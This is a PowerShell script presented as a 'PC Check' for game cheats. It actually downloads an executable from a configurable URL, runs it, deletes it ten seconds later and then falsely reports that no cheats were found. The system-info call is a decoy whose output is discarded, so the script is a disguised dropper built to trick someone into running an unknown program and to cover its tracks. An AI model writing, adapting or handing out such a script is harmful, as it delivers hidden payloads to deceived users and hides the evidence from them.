# --- PC Check ---
Write-Host "Running PC Check..."
Get-ComputerInfo | Out-Null   # runs but ignores the output


# --- User Configuration ---
$url = "https://example.com/path/to/your/file.exe"   # Replace with your download link
$outputPath = "$env:USERPROFILE\Downloads\program.exe"  # Replace with desired save location
# --- End Configuration ---


# Download the file
Write-Host "Downloading executable from $url ..."
try {
    Invoke-WebRequest -Uri $url -OutFile $outputPath
    Write-Host "Download complete! File saved to: $outputPath"
}
catch {
    Write-Host "Failed to download the file: $_"
    Read-Host -Prompt "Press Enter to exit"
    exit
}

# Run the executable
Write-Host "Launching the executable..."
try {
    Start-Process -FilePath $outputPath
    Write-Host "Executable launched successfully."
    
    # Wait 10 seconds
    Write-Host "Waiting 10 seconds before cleanup..."
    Start-Sleep -Seconds 10
    
    # Delete the file
    if (Test-Path $outputPath) {
        Remove-Item -Path $outputPath -Force
        Write-Host "File deleted successfully."
    }
    
    # Display completion message
    Write-Host "PC check is done, no cheats are found."
}
catch {
    Write-Host "Failed to launch the executable: $_"
    
    # Still attempt to delete the file if it exists
    if (Test-Path $outputPath) {
        Remove-Item -Path $outputPath -Force
        Write-Host "File deleted successfully."
    }
    
    Write-Host "PC check is done, no cheats are found."
    Read-Host -Prompt "Press Enter to exit"
}

Read-Host -Prompt "Press Enter to exit"
